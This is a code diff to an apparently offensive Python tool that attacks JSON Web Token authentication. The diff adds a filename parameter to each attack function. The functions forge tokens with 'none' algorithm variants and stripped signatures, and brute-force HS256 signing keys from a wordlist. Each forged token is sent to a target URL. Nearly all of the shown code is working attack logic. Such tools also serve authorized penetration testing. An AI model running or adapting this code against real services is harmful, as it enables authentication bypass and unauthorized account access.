@@ -5,7 +5,7 @@ import HTTP_Module as HTTPm
 from tqdm import tqdm
 
 # token - sample JWT; corrections - list of changes to apply to payload 
-def alg_none(token, corrections, url, mode):
+def alg_none(token, corrections, url, mode, filename):
     
     alg_names = ["NONE", "None", "none", "NoNe", "nOnE"]
     header, payload, signature = token.split(".")
@@ -26,10 +26,10 @@ def alg_none(token, corrections, url, mode):
         exp_payload = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).decode("utf-8").replace("=","")
 
         jwt = exp_header + "." + exp_payload + "."
-        HTTPm.request(jwt, None, url, mode)
+        HTTPm.request(jwt, None, url, mode, filename)
 
 
-def sign_null(token, corrections, url, mode):
+def sign_null(token, corrections, url, mode, filename):
     header, payload, signature = token.split(".")
 
     # == in case of incorrect padding 
@@ -44,10 +44,11 @@ def sign_null(token, corrections, url, mode):
     exp_payload = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).decode("utf-8").replace("=","")
 
     jwt = exp_header + "." + exp_payload + "."
-    HTTPm.request(jwt, None, url, mode)
+    HTTPm.request(jwt, None, url, mode, filename)
 
 
-def weak_key(token, corrections, wordlist, url, mode):
+def weak_key(token, corrections, wordlist, url, mode, filename):
+    print(token, corrections, wordlist, url, mode, filename)
     jwts = []
     header, payload, signature = token.split(".")
     attack_dict = open(wordlist, "r", errors="ignore").read().split("\n")
@@ -63,9 +64,9 @@ def weak_key(token, corrections, wordlist, url, mode):
 
     for key in tqdm(attack_dict, bar_format="{l_bar}{bar:30}{r_bar}{bar:-30b}", colour="WHITE"):
         jwt = pyjwt.encode(payload_dict, key, headers=header_dict, algorithm="HS256")
-        if HTTPm.request(jwt, key, url, mode):
+        if HTTPm.request(jwt, key, url, mode, filename):
             break
 
 
-def key_injection(token, corrections, url, mode):
+def key_injection(token, corrections, url, mode, filename):
     pass
